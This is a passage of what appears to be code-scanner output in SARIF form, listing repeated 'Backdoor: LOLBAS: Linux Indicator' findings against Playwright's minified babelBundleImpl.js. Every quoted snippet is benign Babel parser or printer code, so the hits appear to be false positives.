                      "markdown": "`type:e})}; please wrap it in parentheses.`,PipelineBodyNoArrow:'Unexpected arrow \"=>\" after pipeline body; arrow function in pipeline body must be parenthesized.',PipelineBodySequenceExpression:\"Pipeline body may not be a comma-separated sequence expression.\",PipelineHeadSequenceExpression:\"Pipeline head should not be a comma-separated sequence expression.\",PipelineTopicUnused:\"Pipeline is in topic style but does not use topic reference.\",PrimaryTopicNotAllowed:\"Topic reference was used in a lexical context without topic binding.\",PrimaryTopicRequiresSmartPipeline:'Topic reference is used, but the p`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 9401,
                  "endLine": 25,
                  "endColumn": 9406,
                  "snippet": {
                    "text": "eading 0.\"},ose={StrictDelete:\"Deleting local variable in strict mode.\",StrictEvalArguments:({referenceName:e})=>`Assigning to '${e}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:e})=>`Binding '${e}' in strict mode.`,StrictFunction:\"In strict mode code, functions can only be declared at top level or inside a block.\",StrictNumericEscape:\"The only valid numeric escape in strict mode is '\\\\0'.\",StrictOctalLiteral:\"Legacy octal literals are not allowed in strict mode.\",StrictWith:\"'with' in strict mode.\"},lse=new Set([\"ArrowFunctionExpression\",\"AssignmentExpression\",\"ConditionalExpression\"",
                    "rendered": {
                      "text": "eading 0.\"},ose={StrictDelete:\"Deleting local variable in strict mode.\",StrictEvalArguments:({referenceName:e})=>`Assigning to '${e}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:e})=>`Binding '${e}' in strict mode.`,StrictFunction:\"In strict mode code, functions can only be declared at top level or inside a block.\",StrictNumericEscape:\"The only valid numeric escape in strict mode is '\\\\0'.\",StrictOctalLiteral:\"Legacy octal literals are not allowed in strict mode.\",StrictWith:\"'with' in strict mode.\"},lse=new Set([\"ArrowFunctionExpression\",\"AssignmentExpression\",\"ConditionalExpression\"",
                      "markdown": "`eading 0.\"},ose={StrictDelete:\"Deleting local variable in strict mode.\",StrictEvalArguments:({referenceName:e})=>`Assigning to '${e}' in strict mode.`,StrictEvalArgumentsBinding:({bindingName:e})=>`Binding '${e}' in strict mode.`,StrictFunction:\"In strict mode code, functions can only be declared at top level or inside a block.\",StrictNumericEscape:\"The only valid numeric escape in strict mode is '\\\\0'.\",StrictOctalLiteral:\"Legacy octal literals are not allowed in strict mode.\",StrictWith:\"'with' in strict mode.\"},lse=new Set([\"ArrowFunctionExpression\",\"AssignmentExpression\",\"ConditionalExpression\"`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 7709,
                  "endLine": 25,
                  "endColumn": 7714,
                  "snippet": {
                    "text": "sses.\",UnexpectedToken:({expected:e,unexpected:t})=>`Unexpected token${t?` '${t}'.`:\"\"}${e?`, expected \"${e}\"`:\"\"}`,UnexpectedTokenUnaryExponentiation:\"Illegal expression. Wrap left hand side or entire exponentiation in parentheses.\",UnexpectedUsingDeclaration:\"Using declaration cannot appear in the top level when source type is `script`.\",UnsupportedBind:\"Binding should be performed on object property.\",UnsupportedDecoratorExport:\"A decorated export must export a class declaration.\",UnsupportedDefaultExport:\"Only expressions, functions or classes are allowed as the `default` export.\",UnsupportedIm",
                    "rendered": {
                      "text": "sses.\",UnexpectedToken:({expected:e,unexpected:t})=>`Unexpected token${t?` '${t}'.`:\"\"}${e?`, expected \"${e}\"`:\"\"}`,UnexpectedTokenUnaryExponentiation:\"Illegal expression. Wrap left hand side or entire exponentiation in parentheses.\",UnexpectedUsingDeclaration:\"Using declaration cannot appear in the top level when source type is `script`.\",UnsupportedBind:\"Binding should be performed on object property.\",UnsupportedDecoratorExport:\"A decorated export must export a class declaration.\",UnsupportedDefaultExport:\"Only expressions, functions or classes are allowed as the `default` export.\",UnsupportedIm",
                      "markdown": "`sses.\",UnexpectedToken:({expected:e,unexpected:t})=>`Unexpected token${t?` '${t}'.`:\"\"}${e?`, expected \"${e}\"`:\"\"}`,UnexpectedTokenUnaryExponentiation:\"Illegal expression. Wrap left hand side or entire exponentiation in parentheses.\",UnexpectedUsingDeclaration:\"Using declaration cannot appear in the top level when source type is `script`.\",UnsupportedBind:\"Binding should be performed on object property.\",UnsupportedDecoratorExport:\"A decorated export must export a class declaration.\",UnsupportedDefaultExport:\"Only expressions, functions or classes are allowed as the `default` export.\",UnsupportedIm`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 6784,
                  "endLine": 25,
                  "endColumn": 6789,
                  "snippet": {
                    "text": "laceholder:\"Unexpected argument placeholder.\",UnexpectedAwaitAfterPipelineBody:'Unexpected \"await\" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:\"Unexpected digit after hash token.\",UnexpectedImportExport:\"'import' and 'export' may only appear at the top level.\",UnexpectedKeyword:({keyword:e})=>`Unexpected keyword '${e}'.`,UnexpectedLeadingDecorator:\"Leading decorators must be attached to a class declaration.\",UnexpectedLexicalDeclaration:\"Lexical declaration cannot appear in a single-statement context.\",UnexpectedNewTarget:\"`new.target` can only be",
                    "rendered": {
                      "text": "laceholder:\"Unexpected argument placeholder.\",UnexpectedAwaitAfterPipelineBody:'Unexpected \"await\" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:\"Unexpected digit after hash token.\",UnexpectedImportExport:\"'import' and 'export' may only appear at the top level.\",UnexpectedKeyword:({keyword:e})=>`Unexpected keyword '${e}'.`,UnexpectedLeadingDecorator:\"Leading decorators must be attached to a class declaration.\",UnexpectedLexicalDeclaration:\"Lexical declaration cannot appear in a single-statement context.\",UnexpectedNewTarget:\"`new.target` can only be",
                      "markdown": "`laceholder:\"Unexpected argument placeholder.\",UnexpectedAwaitAfterPipelineBody:'Unexpected \"await\" after pipeline body; await must have parentheses in minimal proposal.',UnexpectedDigitAfterHash:\"Unexpected digit after hash token.\",UnexpectedImportExport:\"'import' and 'export' may only appear at the top level.\",UnexpectedKeyword:({keyword:e})=>`Unexpected keyword '${e}'.`,UnexpectedLeadingDecorator:\"Leading decorators must be attached to a class declaration.\",UnexpectedLexicalDeclaration:\"Lexical declaration cannot appear in a single-statement context.\",UnexpectedNewTarget:\"`new.target` can only be`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 5424,
                  "endLine": 25,
                  "endColumn": 5429,
                  "snippet": {
                    "text": "_proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static property named prototype.\",SuperNotAllowed:\"`super()` is only valid inside a class constructor of a subclass. Ma",
                    "rendered": {
                      "text": "_proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static property named prototype.\",SuperNotAllowed:\"`super()` is only valid inside a class constructor of a subclass. Ma",
                      "markdown": "`_proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static property named prototype.\",SuperNotAllowed:\"`super()` is only valid inside a class constructor of a subclass. Ma`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 5313,
                  "endLine": 25,
                  "endColumn": 5318,
                  "snippet": {
                    "text": "e only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.\",RecordNoProto:\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static p",
                    "rendered": {
                      "text": "e only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.\",RecordNoProto:\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static p",
                      "markdown": "`e only allowed when the 'syntaxType' option of the 'recordAndTuple' plugin is set to 'hash'.\",RecordNoProto:\"'__proto__' is not allowed in Record expressions.\",RestTrailingComma:\"Unexpected trailing comma after rest element.\",SloppyFunction:\"In non-strict mode code, functions can only be declared at top level or inside a block.\",SloppyFunctionAnnexB:\"In non-strict mode code, functions can only be declared at top level, inside a block, or as the body of an if statement.\",SourcePhaseImportRequiresDefault:'Only `import source x from \"./module\"` is valid.',StaticPrototype:\"Classes may not have static p`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 579,
                  "endLine": 24,
                  "endColumn": 584,
                  "snippet": {
                    "text": "ve an initializer.`,ForInUsing:\"For-in loop may not start with 'using' declaration.\",ForOfAsync:\"The left-hand side of a for-of loop may not be 'async'.\",ForOfLet:\"The left-hand side of a for-of loop may not start with 'let'.\",GeneratorInSingleStatementContext:\"Generators can only be declared at the top level or inside a block.\",IllegalBreakContinue:({type:e})=>`Unsyntactic ${e===\"BreakStatement\"?\"break\":\"continue\"}.`,IllegalLanguageModeDirective:\"Illegal 'use strict' directive in function with non-simple parameter list.\",IllegalReturn:\"'return' outside of function.\",ImportAttributesUseAssert:\"The ",
                    "rendered": {
                      "text": "ve an initializer.`,ForInUsing:\"For-in loop may not start with 'using' declaration.\",ForOfAsync:\"The left-hand side of a for-of loop may not be 'async'.\",ForOfLet:\"The left-hand side of a for-of loop may not start with 'let'.\",GeneratorInSingleStatementContext:\"Generators can only be declared at the top level or inside a block.\",IllegalBreakContinue:({type:e})=>`Unsyntactic ${e===\"BreakStatement\"?\"break\":\"continue\"}.`,IllegalLanguageModeDirective:\"Illegal 'use strict' directive in function with non-simple parameter list.\",IllegalReturn:\"'return' outside of function.\",ImportAttributesUseAssert:\"The ",
                      "markdown": "`ve an initializer.`,ForInUsing:\"For-in loop may not start with 'using' declaration.\",ForOfAsync:\"The left-hand side of a for-of loop may not be 'async'.\",ForOfLet:\"The left-hand side of a for-of loop may not start with 'let'.\",GeneratorInSingleStatementContext:\"Generators can only be declared at the top level or inside a block.\",IllegalBreakContinue:({type:e})=>`Unsyntactic ${e===\"BreakStatement\"?\"break\":\"continue\"}.`,IllegalLanguageModeDirective:\"Illegal 'use strict' directive in function with non-simple parameter list.\",IllegalReturn:\"'return' outside of function.\",ImportAttributesUseAssert:\"The `"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 2826,
                  "endLine": 23,
                  "endColumn": 2831,
                  "snippet": {
                    "text": " static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' accessor must have exactly one formal parameter.\",BadSetterRestParameter:\"A 'set' accessor function argument mu",
                    "rendered": {
                      "text": " static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' accessor must have exactly one formal parameter.\",BadSetterRestParameter:\"A 'set' accessor function argument mu",
                      "markdown": "` static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' accessor must have exactly one formal parameter.\",BadSetterRestParameter:\"A 'set' accessor function argument mu`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 2720,
                  "endLine": 23,
                  "endColumn": 2725,
                  "snippet": {
                    "text": "inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' acces",
                    "rendered": {
                      "text": "inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' acces",
                      "markdown": "`inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsingNotInAsyncContext:\"'await using' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncContext:\"'await' is only allowed within async functions and at the top levels of modules.\",AwaitNotInAsyncFunction:\"'await' is only allowed within async functions.\",BadGetterArity:\"A 'get' accessor must not have any formal parameters.\",BadSetterArity:\"A 'set' acces`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 23,
                  "startColumn": 2331,
                  "endLine": 23,
                  "endColumn": 2336,
                  "snippet": {
                    "text": "x:t})=>e===\"UpdateExpression\"?FP.UpdateExpression[String(t)]:FP[e],ase={AccessorIsGenerator:({kind:e})=>`A ${e}ter cannot be a generator.`,ArgumentsInClass:\"'arguments' is only allowed in functions and class methods.\",AsyncFunctionInSingleStatementContext:\"Async functions can only be declared at the top level or inside a block.\",AwaitBindingIdentifier:\"Can not use 'await' as identifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsi",
                    "rendered": {
                      "text": "x:t})=>e===\"UpdateExpression\"?FP.UpdateExpression[String(t)]:FP[e],ase={AccessorIsGenerator:({kind:e})=>`A ${e}ter cannot be a generator.`,ArgumentsInClass:\"'arguments' is only allowed in functions and class methods.\",AsyncFunctionInSingleStatementContext:\"Async functions can only be declared at the top level or inside a block.\",AwaitBindingIdentifier:\"Can not use 'await' as identifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsi",
                      "markdown": "`x:t})=>e===\"UpdateExpression\"?FP.UpdateExpression[String(t)]:FP[e],ase={AccessorIsGenerator:({kind:e})=>`A ${e}ter cannot be a generator.`,ArgumentsInClass:\"'arguments' is only allowed in functions and class methods.\",AsyncFunctionInSingleStatementContext:\"Async functions can only be declared at the top level or inside a block.\",AwaitBindingIdentifier:\"Can not use 'await' as identifier inside an async function.\",AwaitBindingIdentifierInStaticBlock:\"Can not use 'await' as identifier inside a static block.\",AwaitExpressionFormalParameter:\"'await' is not allowed in async function parameters.\",AwaitUsi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 36694,
                  "endLine": 15,
                  "endColumn": 36700,
                  "snippet": {
                    "text": ";this._parenPushNewlineState=s,this.print(t,r),s.printed&&(this.dedent(),this.newline(),this.tokenChar(41))}}print(t,r,n,s,i){var a,o;if(!t)return;this._endsWithInnerRaw=!1;let l=t.type,u=this.format,c=u.concise;t._compact&&(u.concise=!0);let f=this[l];if(f===void 0)throw new ReferenceError(`unknown node of type ${JSON.stringify(l)} with constructor ${JSON.stringify(t.constructor.name)}`);this._printStack.push(t);let p=this._insideAux;this._insideAux=t.loc==null,this._maybeAddAuxComment(this._insideAux&&!p);let m=(a=t.extra)==null?void 0:a.parenthesized,b=i||m&&u.retainFunctionParens&&l===\"FunctionE",
                    "rendered": {
                      "text": ";this._parenPushNewlineState=s,this.print(t,r),s.printed&&(this.dedent(),this.newline(),this.tokenChar(41))}}print(t,r,n,s,i){var a,o;if(!t)return;this._endsWithInnerRaw=!1;let l=t.type,u=this.format,c=u.concise;t._compact&&(u.concise=!0);let f=this[l];if(f===void 0)throw new ReferenceError(`unknown node of type ${JSON.stringify(l)} with constructor ${JSON.stringify(t.constructor.name)}`);this._printStack.push(t);let p=this._insideAux;this._insideAux=t.loc==null,this._maybeAddAuxComment(this._insideAux&&!p);let m=(a=t.extra)==null?void 0:a.parenthesized,b=i||m&&u.retainFunctionParens&&l===\"FunctionE",
                      "markdown": "`;this._parenPushNewlineState=s,this.print(t,r),s.printed&&(this.dedent(),this.newline(),this.tokenChar(41))}}print(t,r,n,s,i){var a,o;if(!t)return;this._endsWithInnerRaw=!1;let l=t.type,u=this.format,c=u.concise;t._compact&&(u.concise=!0);let f=this[l];if(f===void 0)throw new ReferenceError(`unknown node of type ${JSON.stringify(l)} with constructor ${JSON.stringify(t.constructor.name)}`);this._printStack.push(t);let p=this._insideAux;this._insideAux=t.loc==null,this._maybeAddAuxComment(this._insideAux&&!p);let m=(a=t.extra)==null?void 0:a.parenthesized,b=i||m&&u.retainFunctionParens&&l===\"FunctionE`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 41279,
                  "endLine": 12,
                  "endColumn": 41285,
                  "snippet": {
                    "text": "){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPatternParent(){let t=this;do if(!t.path.isPattern())return t.getBlockParent();while(t=t.parent.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getAllBindings(){let t=Object.create(null),r=this;do{for(let n of Object.keys(r.bindings))n in t||(t[n]=r.bindings[n]);r=r.parent}while(r);return t}getAllBindingsOfKind(...t){let r=Object.create(null);for(let n of t){let s=this;do{for(let",
                    "rendered": {
                      "text": "){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPatternParent(){let t=this;do if(!t.path.isPattern())return t.getBlockParent();while(t=t.parent.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getAllBindings(){let t=Object.create(null),r=this;do{for(let n of Object.keys(r.bindings))n in t||(t[n]=r.bindings[n]);r=r.parent}while(r);return t}getAllBindingsOfKind(...t){let r=Object.create(null);for(let n of t){let s=this;do{for(let",
                      "markdown": "`){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPatternParent(){let t=this;do if(!t.path.isPattern())return t.getBlockParent();while(t=t.parent.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getAllBindings(){let t=Object.create(null),r=this;do{for(let n of Object.keys(r.bindings))n in t||(t[n]=r.bindings[n]);r=r.parent}while(r);return t}getAllBindingsOfKind(...t){let r=Object.create(null);for(let n of t){let s=this;do{for(let`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 41076,
                  "endLine": 12,
                  "endColumn": 41082,
                  "snippet": {
                    "text": "ath.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPatternParent(){let t=this;do if(!t.path.isPattern())return t.getBlockParent();while(t=t.parent.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getAllBindings(){let t=Object.creat",
                    "rendered": {
                      "text": "ath.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPatternParent(){let t=this;do if(!t.path.isPattern())return t.getBlockParent();while(t=t.parent.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getAllBindings(){let t=Object.creat",
                      "markdown": "`ath.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPatternParent(){let t=this;do if(!t.path.isPattern())return t.getBlockParent();while(t=t.parent.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getAllBindings(){let t=Object.creat`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 12,
                  "startColumn": 40844,
                  "endLine": 12,
                  "endColumn": 40850,
                  "snippet": {
                    "text": "(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParent(){let t=this;do if(t.path.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPat",
                    "rendered": {
                      "text": "(l);if(!u){let p=WY(i,[]);p._blockHoist=o,[u]=r.unshiftContainer(\"body\",[p]),s||r.setData(l,u)}let c=KY(a,n),f=u.node.declarations.push(c);r.scope.registerBinding(i,u.get(\"declarations\")[f-1])}getProgramParent(){let t=this;do if(t.path.isProgram())return t;while(t=t.parent);throw new Error(\"Couldn't find a Program\")}getFunctionParent(){let t=this;do if(t.path.isFunctionParent())return t;while(t=t.parent);return null}getBlockParent(){let t=this;do if(t.path.isBlockParent())return t;while(t=t.parent);throw new Error(\"We couldn't find a BlockStatement, For, Switch, Function, Loop or Program...\")}getPat",
